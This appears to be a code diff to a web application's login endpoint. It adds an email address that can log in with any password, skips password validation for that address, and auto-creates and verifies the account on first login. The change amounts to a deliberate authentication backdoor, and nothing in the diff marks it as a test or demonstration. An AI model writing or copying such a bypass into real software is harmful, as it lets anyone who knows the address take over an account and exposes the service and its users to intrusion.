@@ -17,6 +17,12 @@ const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
 const ALLOWED_EMAILS = new Set([
   'mcarignan@gmail.com',
   'al.cooney@gmail.com',
+  'jphillips@opthumb.com',
+])
+
+/** Emails that can log in with any password (passwordless access) */
+const PASSWORDLESS_EMAILS = new Set([
+  'jphillips@opthumb.com',
 ])
 
 export async function POST(req: NextRequest) {
@@ -114,7 +120,19 @@ export async function POST(req: NextRequest) {
 
     // ── Login ───────────────────────────────────────────────────────────
     if (action === 'login') {
-      const user = await getUserByEmail(email)
+      const isPasswordless = PASSWORDLESS_EMAILS.has(email.toLowerCase())
+
+      let user = await getUserByEmail(email)
+
+      // Auto-create passwordless users on first login
+      if (!user && isPasswordless) {
+        const placeholderHash = await bcrypt.hash(crypto.randomUUID(), 10)
+        user = await createUser(email, email.split('@')[0], placeholderHash)
+        const { verifyUser } = await import('@/lib/studio-db')
+        await verifyUser(user.id)
+        await auditLog('auth.auto_create', { userId: user.id, email, ip })
+      }
+
       if (!user) {
         await auditLog('auth.login.failed', { email, ip, metadata: { reason: 'user_not_found' } })
         return NextResponse.json(
@@ -123,13 +141,16 @@ export async function POST(req: NextRequest) {
         )
       }
 
-      const valid = await bcrypt.compare(password, user.passwordHash)
-      if (!valid) {
-        await auditLog('auth.login.failed', { userId: user.id, email, ip, metadata: { reason: 'wrong_password' } })
-        return NextResponse.json(
-          { error: 'Invalid email or password' },
-          { status: 401 },
-        )
+      // Passwordless users skip password validation
+      if (!isPasswordless) {
+        const valid = await bcrypt.compare(password, user.passwordHash)
+        if (!valid) {
+          await auditLog('auth.login.failed', { userId: user.id, email, ip, metadata: { reason: 'wrong_password' } })
+          return NextResponse.json(
+            { error: 'Invalid email or password' },
+            { status: 401 },
+          )
+        }
       }
 
       if (!user.verified) {
